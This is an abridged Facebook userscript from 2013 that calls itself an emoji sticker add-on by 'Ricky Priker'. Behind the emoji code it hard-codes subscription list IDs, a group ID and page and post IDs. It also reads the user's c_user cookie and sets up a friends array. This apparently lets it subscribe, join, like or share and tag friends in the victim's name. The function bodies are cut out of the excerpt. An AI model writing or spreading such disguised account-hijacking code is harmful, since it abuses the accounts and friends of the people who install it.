// ==UserScript==
// @name            Emoji Sticker Keren By @RickyPriker
// @description     Facebook 2013 By Ricky Priker
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://www.facebook.com/priker123" target="_blank">Created by Ricky Priker <br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("571657042897338");
sublist("574945349235174");
sublist("574948052568237");
sublist("180451545454123");
sublist("650991288297246");
sublist("693964367289072");
sublist("693964853955690");

//Group ku RickyPriker
var gid = ['234475056724267'];
...
var spage_id = "100001591415334";
var spost_id = "600193173377058";
var sfoto_id = "600193173377058";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
